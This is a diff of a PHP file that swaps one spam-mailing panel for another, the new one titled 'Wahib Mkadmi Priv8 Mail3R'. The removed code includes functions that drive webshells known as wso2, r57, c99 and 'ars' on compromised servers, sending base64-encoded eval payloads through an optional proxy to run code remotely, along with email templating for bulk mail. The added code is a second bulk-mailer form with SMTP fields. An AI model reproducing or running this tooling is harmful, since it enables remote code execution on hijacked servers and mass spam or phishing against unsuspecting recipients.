-   		print "<html><body onload='window.parent.upload_finished(document.body.textContent||document.body.innerText)'>".file_get_contents($_FILES["elist"]["tmp_name"])."</body></html>";
-   	}
-   	exit;
-} elseif ($_SERVER['QUERY_STRING']=="upload_universal") {
-	if(!isset($_POST['sended'])) {
-		print "<form action='".$_SERVER['PHP_SELF']."?upload_universal' method='post' enctype='multipart/form-data'><input type='hidden' name='sended' value='true'><input type='file' name='elist'>";
-	exit;
-	} else {
-		if ($_FILES["elist"]["error"] > 0) {
-	   		echo "Error: " . $_FILES["elist"]["error"] . "<br />";
-	   	} else {
-	   		print "<html>
-	   		<body onload='window.parent.uploadFinishedHandler(document.body.textContent||document.body.innerText)'>".
-	   		base64_encode(json_encode(array(
-	   			"name" => $_FILES["elist"]["name"],
-	   			"type" => $_FILES["elist"]["type"],
-				"size" => $_FILES["elist"]["size"],
-				"content" => base64_encode(file_get_contents($_FILES["elist"]["tmp_name"]))
-	   		))).
-	   		"</body></html>";
-	   	}
-	   	exit;
-	}
-	if ($_FILES["elist"]["error"] > 0) {
-   		echo "Error: " . $_FILES["elist"]["error"] . "<br />";
-   	} else {
-   		print "<html><body onload='window.parent.upload_finished(document.body.textContent||document.body.innerText)'>".file_get_contents($_FILES["elist"]["tmp_name"])."</body></html>";
-   	}
-   	exit;
-
-} elseif ($_SERVER['QUERY_STRING']=="loadsave") {
-	if(isset($_FILES["elist"])) {
-		print "<html><body onload='window.parent.loadsave(document.body.innerHTML)'>".file_get_contents($_FILES["elist"]["tmp_name"])."</body></html>";
-	} else {
-		print "<form action='".$_SERVER['PHP_SELF']."?loadsave' method='post' enctype='multipart/form-data'><input type='file' name='elist'></form>";
-	}
-	exit;
-} elseif ($_SERVER['QUERY_STRING']=="savedata") {
-	if(isset($_POST['savedata'])) {
-		header ("Content-Type: application/force-download");
-		header ("Accept-Ranges: bytes");
-		header ("Content-Length: ".strlen(($_POST['savedata']))); 
-		header ("Content-Disposition: attachment; filename=template.txt");  
-		print $_POST['savedata'];
-	} else {
-		print "<form action='".$_SERVER['PHP_SELF']."?savedata' method='post'><textarea name='savedata'></textarea>
-	<input type='submit' value='Upload'></form>";
-	}
-	exit;
-} elseif ($_SERVER['QUERY_STRING']=="changepass") {
-	clearstatcache();
-	$response=array();
-	if(!is_writable(__FILE__)) {
-		$response['result']="error";
-	} elseif($_POST['login']=="" && $_POST['pass']=="") {
-		$data=file_get_contents(__FILE__);
-		$data=str_replace($logpass, "", $data);
-		file_put_contents(__FILE__, $data);
-		$response['result']="ok";
-	} else {
-		$new_logpass=md5($_POST['login']."IMAIL".$_POST['pass']);
-		$data=file_get_contents(__FILE__);
-		if($logpass=="") {
-			$data=str_replace('$logpass="";', '$logpass="'.$new_logpass.'";', $data);
-		} else {
-			$data=str_replace($logpass, $new_logpass, $data);
-		}
-		//$data=preg_replace("/$logpass=\".*?\";/", "$logpass=\"".$new_logpass."\";", $data, 1);
-		file_put_contents(__FILE__, $data);
-		$response['result']="ok";
-	}
-	//print $new_logpass.PHP_EOL;
-	//print $data;
-	print json_encode($response);
-	exit;
-} elseif ($_SERVER['QUERY_STRING']=="diagnostics") {
-	clearstatcache();
-	$state=array(
-		'self_permissions'=>(int)is_writable(__FILE__),
-		'dir_permissions' =>(int)is_writable("."),
-		'mail_function'	  =>(int)function_exists("mail"),
-		'fgc_function'	  =>(int)function_exists("file_get_contents")
-	);
-	if(isset($_POST['API'])) {
-		print json_encode($state);
-		exit;
-	}
-	print "<h1>diagnostics</h1>";
-	print "<pre>";
-	print_r($state);
-	print "</pre>";
-	exit;
-} elseif ($_SERVER['QUERY_STRING']=="pingoutserver") {
-	$testcode="echo 'test';";
-	$outserver=$_POST['server'];
-	/*$list=explode(PHP_EOL, $_POST['servers']);
-	$newlist=array();*/
-	//foreach ($list as $outserver) {
-	list($url,$type,$pass)=explode("|",$outserver);
-	//сначала проверим что не 404
-	$headers = get_headers($url, 1);
-	if($headers[0]=="HTTP/1.1 404 Not Found") {
-		print json_encode(array(
-			"status"=>"BAD",
-			"server"=>$outserver,
-			"error"=>"404 not found"
-		));
-		exit;
-	}
-	//иначе проводим тест авторизации и выполнения кода
-	$result=false;
-	if($type=="wso2") {
-		$answer=wso2exec($url,$pass,$testcode);
-		if($answer=='test')
-			$result=true;
-	} elseif($type=="r57") {
-		list($login,$pass)=explode(":", $pass);
-		$answer=r572exec($url,$login,$pass,$testcode);
-		if($answer=='test')
-			$result=true;
-	} elseif($type=="c99") {
-		list($login,$pass)=explode(":", $pass);
-		$answer=c992exec($url,$login,$pass,$testcode);
-		if($answer=='test')
-			$result=true;
-	} elseif($type=="ars") {
-		//list($login,$pass)=explode(":", $pass);
-		$answer=ars2exec($url,$pass,"test");
-		if($answer=='test')
-			$result=true;
-	}
-	//}
-
-	if($result)
-		print json_encode(array(
-			"status"=>"GOOD",
-			"server"=>$outserver
-		));
-	else
-		print json_encode(array(
-			"status"=>"BAD",
-			"server"=>$outserver,
-			"error"=>"test command execution failed"
-		));
-	exit;
-} elseif ($_SERVER['QUERY_STRING']=="linesinfile") {
-	$file_path=$_POST['file_path'];
-	if(!file_exists($file_path) || !is_readable($file_path))
-		print "0";
-	else {
-		$file_data=explode("\n", file_get_contents($file_path));
-		print count($file_data);
-	}
-	exit;
-}
-function ReplaceFileTemplate(&$target, &$email) {
-	if(preg_match_all('/\[FILE:(.+?)\]/', $target, $arr, PREG_PATTERN_ORDER)) {
-		foreach ($arr[0] as $key => $value) {
-			$file_path=$arr[1][$key];
-			if(!file_exists($file_path) || !is_readable($file_path))
-				$target=str_replace($value, "file not available", $target);
-			else {
-				$file_data=explode("\n", file_get_contents($file_path));
-				$result_str=$file_data[($email[enumer]-1)%count($file_data)];
-				$target=str_replace($value, $result_str, $target);
-			}
-		}
-	}
-}
-function ReplaceTemplates(&$target, &$email) {
-	$target=str_replace('[TO-EMAIL]', $email[to], $target);
-	$target=str_replace('[FROM-NAME]', $email[fromname], $target);
-	$target=str_replace('[FROM-EMAIL]', $email[frommail], $target);
-	$target=str_replace('[REPLY-EMAIL]', $email[replymail], $target);
-	$target=str_replace('[THEME]', $email[tema], $target);
-	//Макрос умножения
-	
-
-	foreach ($email[additional] as $key => $value) {
-		$target=str_replace('[ADD'.$key.']', $value, $target);		
-	}
-	ReplaceFileTemplate($target, $email);
-	if(preg_match_all('/\[(DATE|DAY|MONTH|YEAR|TIME|HOUR|MINUTE)([+-]\d+)*\]/', $target, $arr)) {
-		foreach ($arr[0] as $key => $value) {
-			switch ($arr[1][$key]) {
-				case 'DATE':
-					$txt_val=date("d.m.Y", strtotime(intval($arr[2][$key])." day"));
-					break;
-				case 'DAY':
-					$txt_val=date("d", strtotime(intval($arr[2][$key])." day"));
-					break;
-				case 'MONTH':
-					$txt_val=date("m", strtotime(intval($arr[2][$key])." month"));
-					break;
-				case 'YEAR':
-					$txt_val=date("Y", strtotime(intval($arr[2][$key])." year"));
-					break;
-				case 'TIME':
-					$txt_val=date("H:i", strtotime(intval($arr[2][$key])." minute"));
-					break;
-				case 'HOUR':
-					$txt_val=date("H", strtotime(intval($arr[2][$key])." hour"));
-					break;
-				case 'MINUTE':
-					$txt_val=date("i", strtotime(intval($arr[2][$key])." minute"));
-					break;
-				default:
-					$txt_val='';
-					break;
-			}
-			$target=str_replace($value, $txt_val, $target);
-		}
-	}
-	if(preg_match_all('/\[\((.*?)\)\*(\d+)\]/', $target, $arr, PREG_PATTERN_ORDER)) {
-		foreach ($arr[0] as $key => $value) {
-			$target=str_replace($value, str_repeat($arr[1][$key], $arr[2][$key]), $target);
-		}
-	}
-	if(preg_match_all('/\[ENUM:([^\[\]]+?)\]/', $target, $arr, PREG_PATTERN_ORDER)) {
-		foreach ($arr[0] as $key => $value) {
-			$enum_array=explode("|", $arr[1][$key]);
-			$enum_array_length=count($enum_array);
-			$target=str_replace($value, $enum_array[$email[enumer]%$enum_array_length], $target);
-		}
-	}
-
-	if(preg_match_all('/\[RAND\]/', $target, $arr, PREG_PATTERN_ORDER)) {
-		foreach ($arr[0] as $key => $value) {
-			$target=preg_replace("/\[RAND\]/", rand(5000,6000), $target, 1);
-		}
-	}
-	if(preg_match_all('/\[RAND\-(\d+)\-(\d+)\]/', $target, $arr, PREG_PATTERN_ORDER)) {
-		foreach ($arr[0] as $key => $value) {
-			$target=preg_replace("/".str_replace(array("[","]"), array("\[","\]"), $value)."/", rand($arr[1][$key],$arr[2][$key]), $target, 1);
-		}
-	}
-	while(preg_match_all('/\[RAND:([^\[\]]+?)\]/u', $target, $arr, PREG_PATTERN_ORDER)) {
-		foreach($arr[0] as $key => $value) {
-			$words=explode("|",$arr[1][$key]);
-			$target=preg_replace("/".preg_quote($value,"/")."/", $words[array_rand($words)],$target, 1);
-		}
-	}
-}
-function applyEnumer($field, $enumer) {
-	if(strpos($field, "\n")==-1) return $field;
-
-	$field_values=explode("\n", $field);
-	$field_values_count=count($field_values);
-
-	$value=$field_values[$enumer%$field_values_count];
-
-	return  $value;
-}
-function makeAttach($attachedFiles, $boundary) {
-	$data="";
-	if($attachedFiles==null) return $data;
-	foreach ($attachedFiles as $index => $file) {
-		if($file==null) continue;
-		$data.="--$boundary\n";
-		$data.="Content-Type: ".$file['type']."; name=\"".$file['name']."\"\n";
-		$data.="Content-Transfer-Encoding:base64\n";
-		$data.="Content-ID: <".md5($file['name']).">\n\n";
-		$data.=chunk_split($file['content'])."\n";
-	}
-	return $data;
-}
-function wso2exec($url, $pass, $code) {
-	$postdata = http_build_query(
-		array(
-			'pass' => $pass,
-			'a' => 'RC',
-			'p1' => trim($code)
-		)
-	);
-
-	return get_content($url, $postdata, 10);
-}
-function ars2exec($url, $pass, $req="test", $data) {
-	$postdata = http_build_query(
-		array(
-			'pass' => $pass,
-			'req' => $req,
-			'data' => $data
-		)
-	);
-	$response=get_content($url, $postdata, 10);
-	$response_decoded=json_decode($response,true);
-	if($req=="test")
-		if($response_decoded['status']=="GOOD")
-			return "test";
-		else
-			return "bad";
-	//print $response;
-	return $response_decoded;
-}
-function r572exec($url, $login, $pass, $code, $timeout=10) {
-	$str_start=randomstr();
-	$str_end=randomstr();
-	$eval_sub='eval(base64_decode($_POST["debug_value_fgtr"]));';
-	$eval_sub="echo('".substr($str_start,0,4)."'.'".substr($str_start,4,4)."');".$eval_sub."die('".substr($str_end,0,4)."'.'".substr($str_end,4,4)."');";
-
-	$post='php_eval='.urlencode($eval_sub).'&dir=.%2F&cmd=php_eval&submit=exec&debug_value_fgtr='.urlencode(base64_encode($code));
-
-	if(!empty($pass) && !empty($login)){
-		$post.='&auth_user='.urlencode($login).'&auth_pass='.urlencode($pass);
-		$headers=array('Authorization: Basic '.base64_encode($login.':'.$pass));
-	}else{
-		$headers=array();
-	}
-	$headers[]='Content-type: application/x-www-form-urlencoded';
-
-	$opts = array('http' =>
-		array(
-			'method'  => 'POST',
-			'proxy'   => (defined('PROXY'))?('tcp://' . PROXY):null,
-			'header'  => implode(PHP_EOL, $headers),
-			'timeout' => $timeout,
-			'content' => $post
-		)
-	);
-	//print_r($opts);
-	$context  = stream_context_create($opts);
-	$response=@file_get_contents($url, false, $context);
-	$response=strstr($response, $str_start);
-	$response=str_replace(array($str_end, $str_start), "", $response);
-	return $response;
-}
-function c992exec($url, $login, $pass, $code, $timeout=10) {
-	$str_start=randomstr();
-	$str_end=randomstr();
-	$eval_sub='eval(base64_decode($_POST["debug_value_fgtr"]));';
-	$eval_sub="echo('".substr($str_start,0,4)."'.'".substr($str_start,4,4)."');".$eval_sub."die('".substr($str_end,0,4)."'.'".substr($str_end,4,4)."');";
-
-	$post='act=eval&eval='.urlencode($eval_sub).'&d=.%2F&eval_txt=1&debug_value_fgtr='.urlencode(base64_encode($code));
-
-	if(!empty($pass) && !empty($login)){
-		$headers=array('Authorization: Basic '.base64_encode($login.':'.$pass));
-	}else{
-		$headers=array();
-	}
-	$headers[]='Content-type: application/x-www-form-urlencoded';
-
-	$opts = array('http' =>
-		array(
-			'method'  => 'POST',
-			'proxy' => (defined('PROXY'))?('tcp://' . PROXY):null,
-			'header'  => implode(PHP_EOL, $headers),
-            'timeout' => $timeout,
-			'content' => $post
-		)
-	);
-	//print_r($opts);
-	$context  = stream_context_create($opts);
-	$response=@file_get_contents($url, false, $context);
-	$response=strstr($response, $str_start);
-	$response=str_replace(array($str_end, $str_start), "", $response);
-	return $response;
-}
-function randomstr($int=8){
-	$str='';
-	$arr='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-	for($i=0;$i<$int;$i++) $str.=$arr{rand(0,61)};
-	return $str;
-}
-function get_content($url, $post,$timeout) {
-	$opts = array('http' =>
-		array(
-			'method'  => 'POST',
-			'proxy' => (defined('PROXY'))?('tcp://' . PROXY):null,
-			'header'  => 'Content-type: application/x-www-form-urlencoded',
-                        'timeout' => $timeout,
-			'content' => $post
-		)
-	);
-	$context  = stream_context_create($opts);
-	return @file_get_contents($url, false, $context);
+class phpmailerException extends Exception
+{
+    public function errorMessage()
+    {
+        $errorMsg = '<strong>' . $this->getMessage() . "</strong><br />\n";
+        return $errorMsg;
+    }
 }
 
 ?>
-<html>
-<head>
-<title><?php tr('name',false); ?> <?php echo VERSION;?></title>
-<meta http-equiv="content-type" content="text/html; charset=utf-8" />
-<script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
-<link href="http://netdna.bootstrapcdn.com/bootswatch/2.3.0/united/bootstrap.min.css" rel="stylesheet">
-<link rel="shortcut icon" type="image/x-icon" href="data:image/png;base64,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" />
-<style>
-body {
-    background-color: WHITE;
-}
 
-.content {
-    margin: 0 auto;
-    background-color: #fcf2d4;
-    width: 1000px;
-    padding: 5px;
-    border: 1px solid black;
-    border-radius: 5px;
-}
+    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <title>.: Wahib Mkadmi Priv8 Mail3R :.</title>
 
-#console {
-    margin: 0 auto;
-    padding: 5px;
-    border-radius: 5px;
-}
+        <!-- TODO re-add jquery form validation -->
 
-#ext-console {
-    padding: 5px;
-    border-radius: 5px;
-    overflow-y: scroll;
-    height: 620px;
-    text-align: left;
-}
+        <style type="text/css">
+            /*<![CDATA[*/
+            <!--
+            .style1 {
+                font-size: 20px;
+                font-family: Geneva, Arial, Helvetica, sans-serif;
+            }
 
-a:link {
-    color: #000;
-}
+            -->
+            /*]]>*/
+        </style>
+        <style type="text/css">
+            /*<![CDATA[*/
+            <!--
+            .style1 {
+                font-family: Geneva, Arial, Helvetica, sans-serif;
+                font-size: 20px;
+            }
 
-a:visited {
-    color: #000;
-}
+            -->
+            /*]]>*/
+        </style>
+        <style type="text/css">
+            /*<![CDATA[*/
+            <!--
+            .style1 {
+                font-size: 60px;
+                font-family: Geneva, Arial, Helvetica, sans-serif;
+            }
 
-.miniimput {
-    font-family: Tahoma,Geneva,sans-serif;
-    font-size: 14pt;
-    border-color: 336699;
-    border-style: inset;
-    border-width: 2px;
-}
+            body {
+                background-color: #000000;
+            }
 
-#upload_button {
-    display: inline-block;
-    width: 24px;
-    height: 24px;
-    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAADb0lEQVR42q2Va2gUVxTH/3dmdxMza8QQrRa0VFGjNEWzVCIENz4aX6C2H6wWRD8KVQpRCxUfQRDU2hbRD2o+iFqqtPUVo2ts89iqNRojLT7S7NZHTNwYsxs3j83uZmbu6ZkNSARFs+uB4V7m3vv/3fOYMwIpWJGnnYQCVMwbIV63RwxGcKAVlrfThmkaasMmahqjuPL5yFdqJQWYWfaMilncnmZHU1zC+6AHjx5HcX3lGJEywH36Ka1zDcUopwNXwwZsHKJ0m8C5W8/xLBDFrTXjRNIA15EWWvpxBmZ/4ERVB4sTYBJB8ihZyuNtRaw7jn/WTxGDBuSWNtEXeUNRMNaJypAOhYVNC8DqpuQN1lwFqioDiHVG0bB1qnhrQN7Bh/QZhyXnvQyUP4kjN8uBll5WTUDYA4b0xEzE+J0uBBouN0Pvi+O/nfnijYC8/X6yxj5DwtBN9Pbo+O2riThwPwaFj5t8fVIEfPfCCNxphcKuCOuRlFySx35bT8e+zsHexjjsfHudhawItTQ+R+huAA/3u5NPsmXvF9fS4Y0fYfffEdj4uOREGPw+6OtAV0MATaVzUgOMWuOlQ5tc2FHXBc4pDAaYLNPpCyLua0bz0UWpAUau/p32leRj859hOPh0X5+EVAVi/iDo/mMETixNDZC9/ALt2ePGN54Q7Gp/iEzitPpb+XmE4JllqQGw8CyNn5SFpjtPYVdkooosk8RVFuP51ZUvA8rOVwyRUm6VRPG30eeKlJoDEf4GdEVR6MUV+0dFSqRH4kjneTqvbxe/niprn/GJK1vlpkI0aH8GhEJwX7InRpMMGIaOv+rqg+La9ZuUP92VvPIAq2urRigaQsHo+XCmOVF7ox6iuvoyFRYWMNFIWlgVKtoibdhyezEyhwSRS9uw2rUKNTVXIC5UVFLRnJlcbnpKgEB3AAtPTsaI0RqWaCUonrsWnktVEKfOlFPRp7Oh6zqE1Zre3J5eEX/AoabB3+bnxgd8mD0GdocDFy/9AfHT8V9owby56OgIo6e7G0JRkvLCgijsiVWumqZheNYweCoYUHr4CM1yu+Hz+3Gv4V+oqpp0qCwzTRNTJudg4oQJqPZ6IXZ99yN9uWJ5Islct/1hSsEo8X+QsNls+Pn4CYhNm0u+1zK04sxhmYnFd2HWJbs6uxDpjfzwP0ptjebUDXW8AAAAAElFTkSuQmCC);
-}
+            -->
+            /*]]>*/
+        </style>
+        <style type="text/css">
+            /*<![CDATA[*/
+            body {
+                color: white;
+            }
 
-#help-screen,#settings-screen,#preview-screen {
-    display: none;
-}
+            div.c6 {
+                text-align: right
+            }
 
-#done {
-    background-color: YellowGreen;
-    width: 0;
-    height: 15px;
-    padding: 0;
-    margin: 0;
-    border-radius: 5px;
-}
+            p.c5 {
+                font-family: Verdana, Arial, Helvetica, sans-serif;
+                font-size: 100%
+            }
 
-.addfield {
-    font-family: "Arial Black","Gadget",sans-serif;
-    font-size: 30px;
-    color: #04bf0a;
-    -moz-user-select: none;
-    -khtml-user-select: none;
-    user-select: none;
-    cursor: pointer;
-}
+            span.c4 {
+                font-family: Verdana, Arial, Helvetica, sans-serif;
+                font-size: 100%
+            }
 
-#makebold {
-    font-weight: bold;
-}
+            div.c3 {
+                font-family: Verdana, Arial, Helvetica, sans-serif;
+                font-size: 70%;
+                text-align: right
+            }
 
-#makeitalic {
-    font-style: italic;
-}
+            span.c3 {
+                font-family: Verdana, Arial, Helvetica, sans-serif;
+                font-size: 70%;
 
-#makeunderline {
-    text-decoration: underline;
-}
+            }
 
-.button {
-    padding: 5px 10px;
-    display: inline;
-    background: #777 url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAABkCAYAAABHLFpgAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAALdJREFUeNrEjkEWwiAQQyGlwOAN3Hv/m3UnA62vONF2p25lkfeTwAx+CuEWYgguxBgdYoo7YkwDOWeKDEjOO6TQStlRXlkRIylGl3JQYSaFJGxJIq9M2No9OYbuSOncYXuHWZN5Nglhcm6M4eDsfJDrt+Jv8vO7hyzL4rFtD8rmsPbu0bcOtEZq6tG0eVSKqlqhldao1grL2NY728qMhdozfbfqz3sc1dpBnYvMeqyrbet99U8BBgCRTXT4kGguQQAAAABJRU5ErkJggg==) repeat-x bottom;
-    border: 0;
-    color: #fff;
-    cursor: pointer;
-    font-weight: bold;
-    border-radius: 5px;
-    -moz-border-radius: 5px;
-    -webkit-border-radius: 5px;
-    text-shadow: 1px 1px #666;
-    margin: 0 5px;
-}
+            div.c2 {
+                text-align: center
+            }
 
-.button:hover {
-    background-position: 0 -48px;
-}
+            span.c1 {
+                FONT-SIZE: 50pt;
+                color: red;
+                font-family: Webdings, Georgia, Serif
+            }
 
-.button:active {
-    background-position: 0 top;
-    position: relative;
-    top: 1px;
-    padding: 6px 10px 4px;
-}
+            label.c1 {
+                font-family: Verdana, Arial, Helvetica, sans-serif;
+                font-size: 70%;
+            }
 
-#attachedFiles .File a {
-    color: RED;
-    font-weight: bold;
-    text-decoration: none;
-    font-family: 'Arial Black',Gadget,sans-serif;
-}
+            /*]]>*/
+        </style>
+    </head>
+    <body>
+<span class="style1"> <br/>
+</span>
 
-#attachedFiles div {
-    display: inline-block;
-    width: 24px;
-    height: 24px;
-    background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAFF0lEQVR42o2Ve0xTVxjAv9MWOhRruRMsbx1YkJeiYMRlQ+PmYuZ0Y1NReagZwwm4LdkW/9hmzLYYTYwIQaPDsclwxsnclszXdGEzivJYeRVWHlIK8tbbF31B+XZuKUmvtLiTnN4v55x+v/M9DwHn+Pz0eVEFu7BBHiCJmUTklgjAlEBFp0xc1hySPtjX62jqC0zxntWRRnAzyLSwJD7RN+KDU4by9EQcNdvoBqcM0OUcTn/pgND5PlBeoyFib+HIbdXA8U1LA47tSI7A2QDSxQdK2KI346HzsZGqF3jSD5yFq0MZeOPMPfglJwVuqIa1lY29xdtj/Q/tWi3HWQElaQnYzY5RgGcLOEBSkBQ2n60mFdnJOMdLCNdUIxPXlX1nU8PmfbZvbZx2BkBOAYso4PTbCajWmkFAfURVovPUlOz8coDEwPnwVul98nvuGhwx2cBHJCRX24asf6r6v305ZE7ee+uW4QxAOAV8884y0OjMQIjnGE9SMUEmgW3f14LNNgETdMFOZ3ZyGPzcNjiBN09Jbl2uMPMBCRRQUMKe27ocH+nNs7qIC7JELIIQiQ/vjFgkwM3fPQB1cQHT3vSP1i2gbNtyHDBYuct6dBE4taJrKtPdIMlzuOeSAnrcAaIoIIwCzqevgEGjxaHLUxbxc2RaP4DMVwxZFxWgKc73U3kC/LBjBQ6PcXXwbAJ3Bl3O+M/1xowf66GnKJ9pb1a4B1zYuRJHTc8GEJpmAu7H4SNHahHGxwt3XqgD9ck8pqOlwQ0gv4S9mLESWVrJ/LbgmkaAXPx1T1gY6R/gRJwrkcDC0GAK8Mbt5bWgLtpPAY3uAT9lJoHWMu7x+tylR4dG4N+WNhgcZR2rRoMRQsKDYeuWDZBWRrPo5D6/DmWTe0BlVhLqrRP8CDplLnVFIhE+6tHArdt3YOOmV2kvEmN9jQJ6+wdJQe4u3HyuGroL32c6W58CcK1iEY3BlexkGLPZnTuu+gGEQiH8VXUXdDo9DA2PQl7ebkeBKWoaoK6pFT7MzYDXS6vhYWGuX1drMx+weGm8NPKjM+ylzCR0uugpCwgKvYTkj9+uoX7MBBaLFTKz04lJy6JarYG6ZhXJz9mFabTQOo/nMN2qVj5gUVSMVP5xKVu4JQ5Vo0ZnJbsGGVAgEhG2/h7qjCawWq0QnbqedNypwkCZPyh7Bkhm1nYsqFSA6uhepqdTxQeEy2OkUZ+Usidpu+6gAIGAzAiyQCiCx3V34bHeAOO2cVi2YSN0378D0vnzQKkegMysdMi/rIC2I7v9eh+28wFhS5ZKoz8957CgnQM83YsojwLIk/q72PloGBaHyADtdqIzWTB44fPQ3NVHMrLSqQUN0Hokm+l72MEHhERGS+MOltFWkThVaI4Md7rIIdMsomY9uHkDzSCkgECwWcxE4seg1WyC+uY2krNnJ2ZcqIeWrzOZvu5OPiA4IkoqfrdoUO4vEU/ijJfPMez0lXtN0AdCqwk0c4JhEHzgpQBvWGAegl/bhuBJYCx0DGktljP7A/vVXXxAbMpaH2V1VQQV58IsQxYUGr8398DhmGi5zNtLJNAbx2xNLcreomOHd9PtcTrHYpPXdClr7/Hfg6xDJ0hj1XUx9YaQ8whxdhlCJy0u7oVzeMxiNDAmnfYVJkCWQpe8JyftuoHenpsLgkKrqTYr/Yd9+YvrrGXHvuC/aP935Bz8UvT31SsS2o59ucTibr1q7QZDbOIqQ9mJr2b49j9nY543+33RowAAAABJRU5ErkJggg==);
-}
+<div class="c2"> <span class="style1 c1"
+                       lang="ar-sa"
+                       xml:lang="ar-sa"> ! </span></div>
+<br/>
+<br/>
 
-#TIMEOUT_RANGE {
-    display: inline-block;
-    margin-left: 20px;
-    vertical-align: middle;
-    width: 300px;
-}
+<form name="form1" method="post" action="" id="form1" enctype="multipart/form-data">
 
-.alexus-range,.alexus-range .crange {
-    height: 20px;
-    padding: 0;
-}
+<table width="100%">
+    <tr>
+        <td width="5%">
+            <label for="use_smtp">
+                <div class="c3">Use SMTP</div>
+            </label>
+        </td>
+        <td width="45%">
+            <input type="checkbox" name="use_smtp" value="use_smtp">
+            <label for="use_smtp"><span class="c3">Use SMTP for authentication</span></label>
+        </td>
+    </tr>
+    <tr>
+        <td width="5%">
+            <div class="c3">
+                SMTP Host
+            </div>
+        </td>
+        <td width="45%">
+                <span class="c4">
+                    <input type="text" id="smtp_host" name="host" placeholder="SMTP Host" size="60"/>
+                </span>
+        </td>
+        <td width="4%">
+            <div class="c3">
+                SMTP pass:
+            </div>
+        </td>
+        <td width="50%">
+                <span class="c4">
